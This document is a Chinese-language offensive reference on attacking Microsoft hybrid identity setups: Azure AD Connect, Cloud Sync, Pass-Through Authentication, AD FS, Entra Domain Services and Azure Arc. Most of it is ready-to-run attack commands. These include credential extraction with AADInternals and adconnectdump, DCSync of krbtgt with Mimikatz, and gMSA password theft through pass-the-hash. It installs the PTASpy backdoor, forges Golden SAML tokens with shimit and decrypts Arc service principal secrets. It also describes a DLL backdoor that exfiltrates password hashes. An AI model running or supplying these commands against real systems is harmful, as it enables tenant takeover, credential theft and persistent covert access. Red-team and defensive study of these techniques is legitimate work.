# 身份同步类攻击详细技术参考

## Azure AD Connect Sync

### 架构概述

Azure AD Connect Sync 是微软的"经典"混合身份同步方案，在本地 AD 服务器上安装 Connect Agent，负责将 AD 用户/组/密码哈希同步到 Entra ID。安装时自动创建以下关键主体：

- **`MSOL_<installationID>`**：本地 AD 账户，拥有 Directory Synchronization Accounts 角色，拥有目录复制（DCSync）权限
- **`ADSyncMSA<id>`**：托管服务账户，无特殊默认权限
- **`ConnectSyncProvisioning_ConnectSync_<id>`**：Entra ID 中的 Service Principal，持有证书认证

### 凭据存储与提取

MSOL 账户的密码以 DPAPI 加密形式存储在 Connect Sync 服务器本地的 SQL 数据库中：

- 数据库路径：`C:\Program Files\Microsoft Azure AD Sync\Data\ADSync.mdf`
- 关键查询：`SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent;`

**方法一：AADInternals 提取**

```powershell
Install-Module -Name AADInternals -RequiredVersion 0.9.0
Import-Module AADInternals
Get-AADIntSyncCredentials
# 输出 MSOL_* 账户的明文密码
```

**方法二：adconnectdump 远程提取**

```bash
# 远程连接 Connect Sync 服务器提取凭据
python adconnectdump.py domain.local/administrator:<password>@<connect_server_ip>

# 离线模式：先导出 ADSync.mdf 再解密
ADSyncQuery.exe C:\path\to\ADSync.mdf > out.txt
python adconnectdump.py domain.local/administrator:<password>@<ip> --existing-db --from-file out.txt
```

### MSOL 账户利用：DCSync

```powershell
# 以 MSOL 账户身份执行命令
runas /netonly /user:domain\MSOL_<id> cmd

# DCSync 提取 KRBTGT 哈希
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\krbtgt /domain:domain.local /dc:dc.domain.local"'

# 提取任意用户哈希
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\administrator /domain:domain.local /dc:dc.domain.local"'
```

### ConnectSyncProvisioning SP 利用

自 2025 年 1 月起，旧版 `Sync_*` 用户不再默认创建，取而代之的是 `ConnectSyncProvisioning_ConnectSync_<id>` Service Principal。该 SP 拥有以下 API 权限：

- `ADSynchronization.ReadWrite.All`
- `PasswordWriteback.OffboardClient.All` / `RefreshClient.All` / `RegisterClientVersion.All`

该 SP 的证书存储在 Connect Sync 服务器上。利用 SharpECUtils 可提取证书（需窃取 `miiserver` 进程的 Token），然后生成 PoP 证明获取 Graph Token，再为 SP 添加新证书实现持久化。

```bash
# 需要从 miiserver 进程窃取 Token 运行
SharpECUtils.exe
```

### Password Writeback 利用（Cloud→AD）

启用 Password Writeback 后，MSOL 账户被授予 AD 中的密码重置权限。从 Entra ID 侧修改用户密码会自动同步到 AD。

**限制**：`adminCount=1` 的用户（Domain Admins 等特权组成员）不受影响。但以下高权限用户可被攻击：
- 直接分配了高权限的用户
- `DNSAdmins` 组成员
- `Group Policy Creator Owners` 组成员
- `Cert Publishers` 组成员
- 其他 `adminCount` 不为 1 的特权组成员

### 枚举命令

```powershell
# 从 AD 侧检测 Connect Sync
Get-ADUser -Filter "samAccountName -like 'MSOL_*'" -Properties * | select SamAccountName,Description | fl
Get-ADServiceAccount -Filter "SamAccountName -like 'ADSyncMSA*'" -Properties SamAccountName,Description
Get-ADUser -Filter "samAccountName -like 'Sync_*'" -Properties * | select SamAccountName,Description | fl

# 从 Entra ID 侧检测同步配置
az rest --url "https://graph.microsoft.com/v1.0/directory/onPremisesSynchronization"
```

---

## Cloud Sync

### 架构概述

Cloud Sync 是微软推荐的新一代同步方案，使用轻量级 Provisioning Agent 替代 Connect Sync。核心主体：

- **Entra ID 侧**：`On-Premises Directory Synchronization Service Account`，拥有 Directory Synchronization Accounts 角色
- **AD 侧**：`provAgentgMSA`（gMSA 账户），SamAccountName 格式为 `pGMSA_<id>$@domain.com`，**默认拥有 DCSync 权限**
- **Entra ID 侧**：`AAD DC Administrators` 组（无默认成员，配合 Domain Services 使用）

### gMSA 凭据提取

gMSA 密码默认仅允许 DC 机器账户读取。攻击路径：

```powershell
# 1. 枚举 gMSA 账户
Get-ADServiceAccount -Filter * -Server domain.local
Get-ADServiceAccount -Identity pGMSA_<id>$ -Properties * -Server domain.local | select PrincipalsAllowedToRetrieveManagedPassword

# 2. 获取 DC 机器账户哈希（需要已有的 DCSync 或本地访问）
lsadump::dcsync /domain:domain.local /user:<dc-name>$

# 3. 以 DC 机器账户身份获取 gMSA 密码
sekurlsa::pth /user:<dc-name>$ /domain:domain.local /ntlm:<hash> /run:"cmd.exe"
$Passwordblob = (Get-ADServiceAccount -Identity pGMSA_<id>$ -Properties msDS-ManagedPassword -server domain.local).'msDS-ManagedPassword'
$decodedpwd = ConvertFrom-ADManagedPasswordBlob $Passwordblob
ConvertTo-NTHash -Password $decodedpwd.SecureCurrentPassword

# 或修改 gMSA 密码读取权限（需要 AD 管理员权限）
Set-ADServiceAccount -Identity 'pGMSA_<id>$' -PrincipalsAllowedToRetrieveManagedPassword 'Domain Admins'
```

### AD→Entra ID 穿越

用户同步到 Entra ID 后，修改 AD 密码会在几分钟内同步到云端：
- 修改已同步用户的密码 → 等待同步 → 使用新密码登录 Entra ID
- 创建新 AD 用户 → 等待同步 → 使用该用户登录 Entra ID
- 通过 gMSA 执行 DCSync → 破解用户密码 → 登录 Entra ID

### Password Sync DLL 后门（持久化）

使用 dnSpy 修改 `C:\Program Files\Microsoft Azure AD Sync\Bin\Microsoft.Online.Passwordsynchronisation.dll` 中的 `PasswordHashGenerator` 类，在 `CreatePasswordHash` 方法中注入代码将用户哈希外传到攻击者服务器。该后门在密码同步时自动触发。

### 枚举命令

```bash
# 从 AD 侧
Get-ADServiceAccount -Filter "ObjectClass -like 'msDS-GroupManagedServiceAccount'"

# 从 Entra ID 侧获取所有配置的 Cloud Sync Agent
az rest --method GET \
  --uri "https://graph.microsoft.com/beta/onPremisesPublishingProfiles('provisioning')/agents/?\$expand=agentGroups" \
  --headers "Content-Type=application/json"
```

---

## PTA（Pass-Through Authentication）

### 架构概述

PTA 是一种不同步密码的认证方式。身份同步到 Entra ID，但认证请求通过本地 PTA Agent 转发到 AD 验证。认证流程：

1. 用户向 Azure AD 提交用户名和密码
2. 凭据加密后放入 Azure AD 队列
3. PTA Agent 从队列取回凭据并解密
4. Agent 在本地 AD 验证凭据，返回结果

### PTASpy 后门安装

控制 PTA Agent 服务器后，可安装 PTASpy 后门：

```powershell
Install-Module AADInternals -RequiredVersion 0.9.3
Import-Module AADInternals

# 安装后门（创建 C:\PTASpy，注入 PTASpy.dll 到认证代理进程）
Install-AADIntPTASpy

# 读取拦截到的明文密码
Get-AADIntPTASpyLog -DecodePasswords

# 移除后门
Remove-AADIntPTASpy
```

**后门效果**：
- 所有通过 PTA 认证的密码以明文形式记录到文件
- 所有密码验证均返回成功（类似 Skeleton Key 攻击）
- 服务重启后后门失效，需重新安装

### 恶意 PTA Agent 注册（持久化）

获取 Global Admin 权限后，可在攻击者控制的服务器上注册新的 PTA Agent：

```powershell
# 注册新的 PTA Agent（需要 GA 凭据）
Install-AADIntPTASpy  # 在新注册的 Agent 上安装后门
```

### 枚举命令

```bash
# 从 Entra ID 侧
az rest --url 'https://graph.microsoft.com/beta/onPremisesPublishingProfiles/authentication/agentGroups?$expand=agents'

# 从本地服务器
Get-Service -Name "AzureADConnectAuthenticationAgent"
```

---

## Federation / Golden SAML

### 架构概述

Federation 使用 AD FS（Active Directory Federation Services）作为身份提供者（IdP），所有认证在本地完成。AD FS 使用 Token Signing 证书签名 SAML Response。SAML Response 中包含用户的 Claims（包括 ImmutableID），Service Provider 验证签名后授权访问。

### Golden SAML 攻击

类似于 Golden Ticket 攻击——掌握签名密钥后可伪造任意用户的认证令牌。

**前置条件**：
- Token Signing 私钥（必须）
- IdP 公钥证书（必须）
- IdP 名称（必须）
- 目标用户的 ImmutableID
- 角色名称（如适用）

**攻击优势**：
- 可远程创建，不需要域内访问
- 即使启用 MFA 也有效
- Token Signing 私钥不自动轮换
- 修改用户密码不影响已生成的 SAML

```powershell
# 从 AD FS 服务器导出 Token Signing 证书
Export-AADIntADFSSigningCertificate

# 获取目标用户的 ImmutableID
[System.Convert]::ToBase64String((Get-ADUser -Identity <username> | select -ExpandProperty ObjectGUID).tobytearray())

# 获取 IdP 名称
(Get-ADFSProperties).Identifier.AbsoluteUri
# 也需检查 Azure AD 侧的 IssuerURI
Get-MsolDomainFederationSettings -DomainName domain.com | select IssuerUri
```

```bash
# 使用 shimit 伪造 SAML Response
python shimit.py -idp http://adfs.domain.com/adfs/services/trust \
  -pk key.pem -c cert.pem \
  -u domain\admin -n admin@domain.com \
  -r ADFS-admin -id 123456789012
```

```powershell
# 使用 AADInternals 模拟用户访问 Office 365
Open-AADIntOffice365Portal -ImmutableID <ImmutableID> \
  -Issuer http://domain.com/adfs/services/trust \
  -PfxFileName ADFSSigningCertificate.pfx -Verbose
```

### 云端仅有用户的 Golden SAML

可为云端仅有用户设置 ImmutableID 后伪造：

```powershell
# 创建并设置 ImmutableID
[System.Convert]::ToBase64String((New-Guid).tobytearray())
Set-AADIntAzureADObject -CloudAnchor "User_<ObjectID>" -SourceAnchor "<ImmutableID>"
# 然后使用 Golden SAML 模拟
```

---

## Domain Services

### 架构概述

Microsoft Entra Domain Services 在 Azure 中部署托管 AD，无需管理 DC。用户从 Entra ID 同步到托管域（需先重置密码触发同步）。

### 穿越路径（Cloud→AD）

1. 将攻击者用户加入 `AAD DC Administrators` 组
2. 该组成员在域内 VM 上拥有本地管理员权限（通过 GPO `AADDC Computers GPO` 实现）
3. 通过 RDP 接入域内 VM
4. 从 VM 内部可执行域攻击（数据窃取、密码转储等）

**限制**：该托管域中的数据不会反向同步到 Entra ID。但 VM 上的 Managed Identity 可能拥有 Azure 权限。

### 枚举命令

```bash
# 查询 Domain Services 配置
az rest --method post \
  --url "https://management.azure.com/providers/Microsoft.ResourceGraph/resources?api-version=2021-03-01" \
  --body '{"subscriptions":["<sub_id>"],"query":"resources | where type == \"microsoft.aad/domainservices\""}'

# 获取域配置详情
az rest --url "https://management.azure.com/subscriptions/<sub_id>/resourceGroups/<rg>/providers/Microsoft.AAD/DomainServices/<domain>?api-version=2022-12-01&healthdata=true"
```

---

## Arc GPO 部署脚本注入

### 架构概述

Azure Arc 使用 GPO 将域内服务器接入 Azure。部署工具包包含 `DeployGPO.ps1`、`EnableAzureArc.ps1` 和 `AzureArcDeployment.psm1`。Service Principal 密钥使用 DPAPI-NG 加密存储在网络共享的 `AzureArcDeploy` 目录中，仅允许 Domain Computers 和 Domain Controllers 安全组解密。

### 攻击路径

**前置条件**：
1. 已渗透内网
2. 可创建或控制 AD 机器账户
3. 发现包含 `AzureArcDeploy` 目录的网络共享

```powershell
# 1. 创建机器账户（利用 MachineAccountQuota）
Import-Module powermad
New-MachineAccount -MachineAccount fake01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# 2. 以机器账户身份运行（将 TGT 加载到内存）
runas /user:fake01$ /netonly powershell
# 或使用 Rubeus
.\Rubeus.exe asktgt /user:fake01$ /password:123456 /ptt

# 3. 解密 Service Principal 密钥
Import-Module .\AzureArcDeployment.psm1
$encryptedSecret = Get-Content "\\share\AzureArcDeploy\encryptedServicePrincipalSecret"
$ebs = [DpapiNgUtil]::UnprotectBase64($encryptedSecret)

# 4. 从 ArcInfo.json 获取 TenantId、SP ClientId、ResourceGroup 等信息
# 5. 使用 Azure CLI 以 Service Principal 身份认证
az login --service-principal -u <ClientId> -p <DecryptedSecret> --tenant <TenantId>
```

### Hybrid Misc：强制同步攻击

通过修改 AD 用户的 `ProxyAddress` 属性（添加 Entra ID 管理员的 SMTP 地址）并匹配 UPN，可强制将 Entra ID 用户同步到本地 AD。

**当前限制**：微软已阻止管理员账户的强制同步，且不绕过 MFA。
